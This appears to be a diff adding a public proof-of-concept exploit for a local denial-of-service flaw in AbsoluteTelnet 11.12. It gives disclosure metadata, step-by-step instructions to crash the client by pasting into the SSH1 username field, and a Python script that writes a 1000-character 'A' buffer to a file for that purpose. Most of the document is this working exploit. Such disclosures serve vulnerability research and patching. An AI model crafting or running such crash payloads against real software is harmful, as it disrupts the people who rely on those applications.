@@ -1,0 +1,22 @@
+# Exploit Title: AbsoluteTelnet 11.12 - 'SSH1/username' Denial of Service (PoC)
+# Discovery by: chuyreds
+# Discovery Date: 2020-05-02
+# Vendor Homepage: https://www.celestialsoftware.net/
+# Software Link : https://www.celestialsoftware.net/telnet/AbsoluteTelnet11.12.exe
+# Tested Version: 11.12
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to produce the crash:
+# 1.- Run python code: AbsoluteTelnet 11.12_username_ssh1.py
+# 2.- Open absolutetelnet_username_SSH1.txt and copy content to clipboard
+# 3.- Open AbsoluteTelnet
+# 4.- Select "new connection file", "Connection", "SSH1", "Use last username"
+# 5.- In "username" field paste Clipboard
+# 6.- Select "OK"
+# 7.- Crashed
+
+buffer = "\x41" * 1000
+f = open ("absolutetelnet_username_SSH1.txt", "w")
+f.write(buffer)
+f.close()
